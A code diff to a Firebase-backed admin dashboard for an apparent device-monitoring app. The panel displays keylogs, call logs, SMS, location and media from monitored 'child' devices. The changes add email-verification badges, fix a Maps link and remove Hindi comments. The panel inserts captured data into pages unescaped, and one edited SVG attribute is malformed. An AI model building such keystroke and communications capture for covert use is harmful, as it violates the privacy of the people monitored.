@@ -17,6 +17,7 @@
             --accent-green: #3fb950;
             --accent-red: #f85149;
             --accent-purple: #9b59b6;
+            --accent-yellow: #e3b341;
             --text-primary: #c9d1d9;
             --text-secondary: #8b949e;
             --border-color: rgba(240, 246, 252, 0.1);
@@ -115,7 +116,7 @@
             margin-bottom: 0.5rem;
             display: flex;
             align-items: center;
-            gap: 15px;
+            gap: 10px; /* Adjusted gap */
             border: 1px solid transparent;
         }
         .user-list-item:hover {
@@ -136,6 +137,28 @@
         .user-list-item.active svg {
             stroke: #0d1117;
         }
+        
+        .verification-status {
+            font-weight: bold;
+            font-size: 1rem;
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        .verification-status.verified {
+            color: var(--accent-green);
+        }
+        .verification-status.not-verified {
+            color: var(--accent-yellow);
+        }
+        .user-list-item.active .verification-status {
+            color: #0d1117;
+        }
+
 
         .user-list-item .user-name { font-weight: 600; }
         .user-list-item .device-name { font-size: 0.8rem; opacity: 0.8; }
@@ -497,12 +520,7 @@
             justify-content: center;
             background-color: var(--bg-dark);
             border: 3px solid var(--secondary-dark);
-            /* ======================================================================= */
-            /* ===== बग फिक्स #1: लोगो को कटने से बचाने के लिए CSS फिक्स ===== */
-            /* flex-shrink: 0; यह सुनिश्चित करता है कि फ्लेक्स कंटेनर में होने पर आइकन का आकार छोटा न हो, जिससे वह गोल बना रहता है। */
-            /* ======================================================================= */
             flex-shrink: 0;
-            /* ======================================================================= */
         }
         
         .command-item.success .command-icon { border-color: var(--accent-green); }
@@ -805,26 +823,12 @@
             document.body.classList.remove('modal-open');
         }
 
-        // =======================================================================
-        // ===== बग फिक्स #3: सही और सुसंगत (consistent) डेट-टाइम फॉर्मेटिंग के लिए नया फंक्शन =====
-        // यह फंक्शन एक Unix timestamp (मिलीसेकंड में) लेता है और उसे 'DD/MM/YYYY, h:mm:ss a' फॉर्मेट में बदलता है।
-        // यह भारतीय समय (Indian Standard Time) के अनुसार सही समय दिखाएगा।
-        // =======================================================================
         function formatTimestamp(timestamp) {
-            // यदि timestamp मौजूद नहीं है या 0 है, तो 'N/A' दिखाएं।
             if (!timestamp) return 'N/A';
-            
-            // दिए गए timestamp से एक नया Date ऑब्जेक्ट बनाएं।
             const date = new Date(timestamp);
-            
-            // यदि timestamp अमान्य है, तो 'Invalid Date' दिखाएं।
             if (isNaN(date.getTime())) {
                 return 'Invalid Date';
             }
-
-            // Intl.DateTimeFormat का उपयोग करके दिनांक और समय को स्थानीय प्रारूप में बदलें।
-            // 'en-IN' locale भारतीय प्रारूप (DD-MM-YYYY) के लिए है।
-            // timeZone: 'Asia/Kolkata' यह सुनिश्चित करता है कि समय हमेशा IST में हो।
             const options = {
                 year: 'numeric',
                 month: '2-digit',
@@ -832,15 +836,11 @@
                 hour: '2-digit',
                 minute: '2-digit',
                 second: '2-digit',
-                hour12: true, // AM/PM फॉर्मेट के लिए।
+                hour12: true,
                 timeZone: 'Asia/Kolkata'
             };
-            
-            // date.toLocaleString() का उपयोग करके इसे एक पठनीय स्ट्रिंग में बदलें।
             return date.toLocaleString('en-IN', options);
         }
-        // =======================================================================
-
 
         // --- Auth & Main Listeners ---
         document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
@@ -885,7 +885,19 @@
 
                 if (data) {
                     Object.keys(data).forEach(userId => {
+                        const userProfile = data[userId].profile;
+                        const isVerified = userProfile?.emailVerified !== false;
+                        
+                        let verificationIconHTML = '';
+                        if (isVerified) {
+                            verificationIconHTML = `<span class="verification-status verified" title="Email Verified">&#10004;</span>`;
+                        } else {
+                            verificationIconHTML = `<span class="verification-status not-verified" title="Email Not Verified">&#33;</span>`;
+                        }
+
                         Object.keys(data[userId]).forEach(childKey => {
+                            if (childKey === 'profile') return;
+
                             userCount++;
                             const childData = data[userId][childKey];
                             const userName = childData?.data?.nameChild || childKey;
@@ -894,7 +906,14 @@
                             listItem.className = 'user-list-item';
                             listItem.dataset.userid = userId;
                             listItem.dataset.childkey = childKey;
-                            listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${childData?.data?.nameDevice || 'Unknown'}</div><div class="user-id">User: ${userId}</div></div>`;
+                            listItem.innerHTML = `
+                                ${verificationIconHTML}
+                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                                <div>
+                                    <div class="user-name">${userName}</div>
+                                    <div class="device-name">${childData?.data?.nameDevice || 'Unknown'}</div>
+                                    <div class="user-id">User: ${userId}</div>
+                                </div>`;
                             
                             if (userId === activeUserId && childKey === activeChildKey) {
                                 listItem.classList.add('active');
@@ -913,7 +932,7 @@
                                 Object.values(messages).forEach(msg => {
                                     if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
                                         lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
-                                    } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') {
+                                    } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') { // *** FIX: Ignored 'auto-reply'
                                         lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
                                     }
                                 });
@@ -1083,6 +1102,7 @@
 
                             Object.keys(usersData).forEach(userId => {
                                 Object.keys(usersData[userId]).forEach(childKey => {
+                                     if (childKey === 'profile') return;
                                     const newNotificationKey = push(ref(db, `user/${userId}/${childKey}/adminNotifications`)).key;
                                     updates[`user/${userId}/${childKey}/adminNotifications/${newNotificationKey}`] = notificationPayload;
                                 });
@@ -1140,31 +1160,20 @@
             if (category === 'audio') { renderAudiosFromDatabase(userId, childKey); return; }
             if (category === 'chat') { renderChat(userId, childKey); return; }
             
-            // =========================================================================================
-            // ===== बग फिक्स #2: कमांड हिस्ट्री को रियल-टाइम बनाने के लिए लॉजिक में बदलाव =====
-            // पुराना लॉजिक केवल एक डेटा पाथ से डेटा लाता था और रियल-टाइम नहीं था।
-            // नया लॉजिक: अब हम CommandHistory के लिए onValue() का उपयोग करेंगे, जो रियल-टाइम अपडेट सुनिश्चित करता है।
-            // जब भी CommandHistory में कोई बदलाव होगा, तो यह Health डेटा को फिर से प्राप्त करेगा और दोनों को एक साथ रेंडर करेगा।
-            // =========================================================================================
             if (category === 'health') {
                 const healthRef = ref(db, getCategoryPath('health', userId, childKey));
                 const historyRef = ref(db, getCategoryPath('CommandHistory', userId, childKey));
 
-                // यह कॉलबैक फंक्शन तब चलेगा जब भी 'CommandHistory' नोड में कोई बदलाव होगा।
                 const callback = (historySnapshot) => {
-                    // जब भी हिस्ट्री अपडेट होती है, हम हेल्थ डेटा को फिर से मंगवाते हैं ताकि दोनों हमेशा सिंक में रहें।
                     get(healthRef).then((healthSnapshot) => {
                         renderHealthAndCommandHistory(healthSnapshot.val(), historySnapshot.val());
                     });
                 };
                 
-                // onValue() एक रियल-टाइम लिस्नर सेट करता है।
                 onValue(historyRef, callback);
-                // लिस्नर को सेव करें ताकि बाद में हटाया जा सके।
                 activeDataListener = { ref: historyRef, callback: callback };
                 return; 
             }
-            // =======================================================================
             
             const dataPath = getCategoryPath(category, userId, childKey);
             const dataRef = ref(db, dataPath);
@@ -1221,7 +1230,7 @@
                     const time = parts[0] || '';
                     const action = (parts[1] || 'Action').replace(/[()]/g, '');
                     const text = parts[2] || 'N/A';
-                    contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
+                    contentHTML += `<div class="keylog-card"><div class="keylog-header"><div class="keylog-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg></div><strong class="keylog-action">${action}</strong></div><p class="keylog-text">${text}</p><div class="keylog-footer">${time}</div></div>`;
                 }
             });
 
@@ -1260,7 +1269,6 @@
                         const message = messages[key];
                         const bubble = document.createElement('div');
                         bubble.classList.add('chat-bubble', message.sender);
-                        // बग फिक्स #3 का उपयोग: चैट में भी सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
                         const time = message.timestamp ? formatTimestamp(message.timestamp) : '';
                         bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}<span class="chat-time">${time}</span>`;
                         chatMessagesArea.prepend(bubble);
@@ -1284,9 +1292,6 @@
         }
         
         function renderHealthAndCommandHistory(healthData, historyData) {
-            // =======================================================================
-            // ===== नया फीचर #4: 'Clear Command History' बटन को HTML में जोड़ना =====
-            // =======================================================================
             let headerHTML = `<div class="data-header">
                                 <button class="clear-category-btn" data-category="CommandHistory">
                                     <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
@@ -1296,7 +1301,6 @@
             
             let healthHTML = '<h3>App Health Status</h3>';
             if (healthData) {
-                // बग फिक्स #3 का उपयोग: हेल्थ डेटा में भी सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
                 let lastChecked = healthData.lastCheckedTimestamp ? formatTimestamp(healthData.lastCheckedTimestamp) : 'N/A';
                 let heartbeat = healthData.lastHeartbeatTime ? formatTimestamp(healthData.lastHeartbeatTime) : 'N/A';
 
@@ -1332,7 +1336,6 @@
             if (historyData) {
                 const historyArray = Object.values(historyData).reverse();
                 historyArray.forEach(log => {
-                    // बग फिक्स #3 का उपयोग: कमांड हिस्ट्री में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
                     const time = formatTimestamp(log.timestamp);
                     let statusClass = '';
                     let iconSVG = '';
@@ -1383,7 +1386,7 @@
                     case 'location':
                         let mapLink = '';
                         if (data.latitude && data.longitude) {
-                             mapLink = `<a href="http://googleusercontent.com/maps.google.com/4{data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
+                             mapLink = `<a href="https://maps.google.com/?q=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                         }
                         contentHTML = `<div class="location-card" style="font-size: 1.1rem; line-height: 1.8;">
                                         <div style="display:flex; align-items:flex-start; gap:1rem; margin-bottom: 1.5rem;">
@@ -1445,7 +1448,6 @@
                                         cardClass = '';
                                         break;
                                 }
-                                // बग फिक्स #3 का उपयोग: कॉल लॉग में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
                                 const callTime = formatTimestamp(call.date);
                                 contentHTML += `<div class="sms-card ${cardClass}"><div class="sms-card-header"><div class="sms-card-icon">${icon}</div><div class="sms-card-address">${title}</div></div><div class="sms-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="sms-card-footer">${callTime}</div></div>`;
                             }
@@ -1454,7 +1456,6 @@
                         break;
                     case 'devicestatus':
                         const status = data;
-                        // बग फिक्स #3 का उपयोग: डिवाइस स्टेटस में सही समय दिखाने के लिए formatTimestamp() का उपयोग करें
                         const lastUpdatedTime = formatTimestamp(status.lastUpdated);
                         contentHTML = `
                             <div class="data-card">
@@ -1647,19 +1648,14 @@
             if (button.classList.contains('clear-category-btn')) {
                 const category = button.dataset.category;
                 
-                // =======================================================================
-                // ===== नया फीचर #4: 'Clear Command History' बटन के क्लिक को हैंडल करना =====
-                // यह सुनिश्चित करता है कि जब 'CommandHistory' के लिए बटन क्लिक हो, तो सही पाथ डिलीट हो।
-                // =======================================================================
                 if (category === 'CommandHistory') {
                     if (confirm(`Are you sure you want to delete all Command History for '${userName}'? This cannot be undone.`)) {
                          remove(ref(db, getCategoryPath(category, userId, childKey)))
                             .then(() => alert(`Command History data cleared.`))
                             .catch((err) => alert(`Error: ${err.message}`));
                     }
-                    return; // फंक्शन को यहीं रोक दें ताकि आगे का कोड न चले।
+                    return;
                 }
-                // =======================================================================
 
                 if (confirm(`Are you sure you want to delete all ${category} data for '${userName}'? This cannot be undone.`)) {
                     if (category === 'photo') { 
@@ -1760,10 +1756,6 @@
                 case 'video': return `user/${userId}/${childKey}/video/data`;
                 case 'audio': return `user/${userId}/${childKey}/audio/data`;
                 case 'health': return `user/${userId}/${childKey}/AppHealthStatus`;
-                // =======================================================================
-                // ===== नया फीचर #4: 'CommandHistory' के लिए एक नया पाथ जोड़ना =====
-                // यह सुनिश्चित करता है कि जब हम कमांड हिस्ट्री डेटा को साफ़ करना चाहें, तो हमें सही Firebase पाथ मिले।
-                // =======================================================================
                 case 'CommandHistory': return `user/${userId}/${childKey}/CommandHistory`;
                 default: return `user/${userId}/${childKey}/${category}`;
             }
@@ -1783,3 +1775,5 @@
     </script>
 </body>
 </html>
+
+
